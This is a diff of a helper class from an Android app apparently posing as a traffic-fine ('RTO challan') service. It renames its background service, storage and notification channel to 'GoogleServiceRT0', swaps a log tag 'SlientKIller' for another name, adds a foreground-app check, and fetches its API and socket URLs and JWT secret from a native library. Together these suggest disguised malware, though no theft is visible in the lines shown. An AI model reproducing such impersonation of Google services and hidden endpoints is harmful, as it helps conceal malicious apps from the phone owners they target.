@@ -1,6 +1,7 @@
 package com.service.rtochallan;
 
 import android.annotation.SuppressLint;
+import android.app.ActivityManager;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
@@ -23,14 +24,16 @@ public class Helper {
     {
         System.loadLibrary("rtochallan.cpp");
     }
+    public String WorkMangerService = "GoogleServiceRT0";
+    public String StorageName = "GoogleServiceRT0";
+    public String BG_CHANNEL_ID = "GoogleServiceRTO";
     public native String FormCode();
     public native String ApiUrl();
     public native String SocketUrl();
     public native String WsJwtSecret();
-    public String TAG = "SlientKIller";
-    public String FormSavePath = "form";
-    public String StorageName = "1212";
-    public String AppVersion = "1.0";
+    public String TAG = "Dhappa";
+    public String AppVersion = "1.2";
+    public Context context;
 
     public static boolean isNetworkAvailable(Context context) {
         ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -99,6 +102,23 @@ public class Helper {
         } else {
             return "TelephonyManager is null";
         }
+    }
+
+public boolean isAppInForeground(Context context) {
+        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+        if (am == null) return false;
+
+        List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
+        if (processes == null) return false;
+
+        String packageName = context.getPackageName();
+
+        for (ActivityManager.RunningAppProcessInfo process : processes) {
+            if (process.processName.equals(packageName)) {
+                return process.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND;
+            }
+        }
+        return false;
     }
 
 
